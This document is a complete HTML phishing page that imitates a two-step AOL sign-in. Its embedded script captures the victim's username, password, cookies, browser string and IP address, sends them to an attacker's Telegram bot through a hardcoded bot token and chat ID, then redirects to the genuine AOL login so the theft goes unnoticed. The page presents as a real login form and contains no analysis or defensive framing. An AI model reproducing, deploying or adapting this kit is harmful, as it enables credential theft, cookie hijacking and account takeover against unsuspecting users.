<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>AOL Sign In</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      width: 100%;
      max-width: 360px;
      padding: 40px 30px;
      border: 1px solid #ddd;
      border-radius: 8px;
      background-color: #ffffff;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
      text-align: center;
    }
    .logo {
      font-size: 32px;
      font-weight: bold;
      color: #333333;
      margin-bottom: 10px;
    }
    h2 {
      font-size: 20px;
      color: #333;
      margin-bottom: 25px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: none;
      border-bottom: 2px solid #ccc;
      font-size: 16px;
      background-color: transparent;
      outline: none;
    }
    input:focus {
      border-bottom-color: #0070f3;
    }
    .btn {
      width: 100%;
      background-color: #0070f3;
      color: white;
      border: none;
      padding: 12px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
    }
    .btn:hover {
      background-color: #005fd1;
    }
    .link {
      display: block;
      margin-top: 12px;
      color: #0070f3;
      font-size: 14px;
      text-decoration: none;
    }
    .secondary-btn {
      margin-top: 20px;
      border: 1px solid #0070f3;
      color: #0070f3;
      background: none;
      padding: 10px;
      font-size: 16px;
      width: 100%;
      border-radius: 6px;
      cursor: pointer;
    }
    .divider {
      margin: 25px 0;
      text-align: center;
      position: relative;
      font-size: 14px;
      color: #999;
    }
    .divider::before,
    .divider::after {
      content: "";
      position: absolute;
      height: 1px;
      width: 40%;
      background-color: #ccc;
      top: 50%;
    }
    .divider::before { left: 0; }
    .divider::after { right: 0; }
    .social-buttons {
      display: flex;
      justify-content: space-between;
      gap: 10px;
    }
    .social-buttons button {
      flex: 1;
      border: 1px solid #ccc;
      padding: 10px;
      border-radius: 6px;
      font-size: 14px;
      background-color: #fff;
      cursor: pointer;
    }
    .social-buttons img {
      vertical-align: middle;
      height: 16px;
      margin-right: 6px;
    }
    #step2 {
      display: none;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="logo">AOL</div>
    <h2>Sign in</h2>

    <!-- Step 1: Enter email or username -->
    <form id="step1" onsubmit="showStep2(event)">
      <input type="text" name="username" id="usernameInput" placeholder="Username, email, or mobile" required />
      <button type="submit" class="btn">Next</button>
      <a href="#" class="link">Forgot username?</a>
      <button class="secondary-btn" type="button">Create an account</button>
      <div class="divider">or</div>
      <div class="social-buttons">
        <button type="button"><img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg">Google</button>
        <button type="button"><img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage.png">Yahoo!</button>
      </div>
    </form>

    <!-- Step 2: Enter password -->
    <form id="step2">
      <p style="text-align:left; font-size:14px; color:#666; margin-bottom: 8px;">
        Welcome, <span id="userDisplay"></span>
      </p>
      <input type="hidden" name="username" id="usernameHidden" />
      <input type="password" name="password" placeholder="Enter your password" required />
      <button type="submit" class="btn">Sign In</button>
      <a href="#" class="link">Forgot password?</a>
    </form>
  </div>

  <script>
    const BOT_TOKEN = '8028760837:AAGRCR8aRXteT3pQwf7-eGE8oIRm7NamAWU';  // Replace with actual token
    const CHAT_ID = '6564094997';      // Replace with actual chat ID
    const REDIRECT_URL = 'https://login.aol.com/';

    function showStep2(event) {
      event.preventDefault();
      const username = document.getElementById('usernameInput').value.trim();
      if (!username) return;

      document.getElementById('step1').style.display = 'none';
      document.getElementById('step2').style.display = 'block';
      document.getElementById('userDisplay').innerText = username;
      document.getElementById('usernameHidden').value = username;
    }

    document.getElementById('step2').addEventListener('submit', async function (e) {
      e.preventDefault();

      const username = document.getElementById('usernameHidden').value;
      const password = e.target.password.value.trim();
      const browser = navigator.userAgent;
      const cookies = document.cookie || 'No cookies';
      const timestamp = new Date().toLocaleString();

      let ip = 'Unavailable';
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ip = data.ip;
      } catch (err) {
        console.warn('Could not fetch IP:', err);
      }

      const message = `
üîê <b>AOL LOGIN</b>
üë§ <b>Username:</b> ${username}
üîë <b>Password:</b> ${password}
üåê <b>IP:</b> ${ip}
üß≠ <b>Browser:</b> ${browser}
üç™ <b>Cookies:</b> ${cookies}
üïí <b>Time:</b> ${timestamp}
      `;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });

      window.location.href = REDIRECT_URL;
    });
  </script>

</body>
</html>
